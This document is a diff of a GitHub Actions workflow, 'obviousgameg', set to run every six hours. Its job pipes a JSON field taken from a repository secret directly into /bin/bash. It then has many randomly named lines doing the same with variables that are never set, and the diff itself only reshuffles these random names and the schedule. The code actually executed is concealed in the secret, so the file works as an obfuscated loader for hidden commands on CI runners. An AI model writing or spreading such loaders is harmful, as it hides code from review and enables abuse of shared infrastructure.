@@ -1,32 +1,35 @@
 name: obviousgameg
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
+    - cron: '26 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: obviousgameg
         env:
-          pnvm200: ${{ secrets.pnvm200 }}
+          an6973: ${{ secrets.an6973 }}
         run: |
-          echo $pnvm200 | jq -r .wkdhq26 | /bin/bash
-          echo $fqeo153 | jq -r .bhfnn3 | /bin/bash
-          echo $tqy5728 | jq -r .afgg667 | /bin/bash
-          echo $ign9838 | jq -r .krp465 | /bin/bash
-          echo $if2 | jq -r .dhnb0761 | /bin/bash
-          echo $in35327 | jq -r .qc32 | /bin/bash
-          echo $dq71 | jq -r .jnpkp31435 | /bin/bash
-          echo $bb882 | jq -r .lvnlf10 | /bin/bash
-          echo $us55 | jq -r .hls788 | /bin/bash
-          echo $bdnz10 | jq -r .ayvld659 | /bin/bash
-          echo $tpzc379 | jq -r .ekkl60 | /bin/bash
-          echo $wa294 | jq -r .evf36 | /bin/bash
-          echo $maaw32 | jq -r .o78 | /bin/bash
-          echo $y9651 | jq -r .b21 | /bin/bash
-          echo $ux0 | jq -r .ubzf126 | /bin/bash
+          echo $an6973 | jq -r .vpkk627 | /bin/bash
+          echo $src90370 | jq -r .i58359 | /bin/bash
+          echo $l761 | jq -r .rptjm13 | /bin/bash
+          echo $tafsi75686 | jq -r .dajbp33 | /bin/bash
+          echo $mahje324 | jq -r .lfu1 | /bin/bash
+          echo $zw8 | jq -r .zq12332 | /bin/bash
+          echo $vjie710 | jq -r .fo187 | /bin/bash
+          echo $mvvi27210 | jq -r .b36 | /bin/bash
+          echo $iwdtu731 | jq -r .xyrso29349 | /bin/bash
+          echo $zdvkd78 | jq -r .j559 | /bin/bash
+          echo $bc97402 | jq -r .hmago452 | /bin/bash
+          echo $un3212 | jq -r .tk29 | /bin/bash
+          echo $s6 | jq -r .dnw3593 | /bin/bash
+          echo $ik55199 | jq -r .cif39635 | /bin/bash
+          echo $cr136 | jq -r .bqyaf17785 | /bin/bash
+          echo $vboc6 | jq -r .d6774 | /bin/bash
+          echo $t127 | jq -r .fmk42644 | /bin/bash
+          echo $jjid2612 | jq -r .vz2 | /bin/bash
 
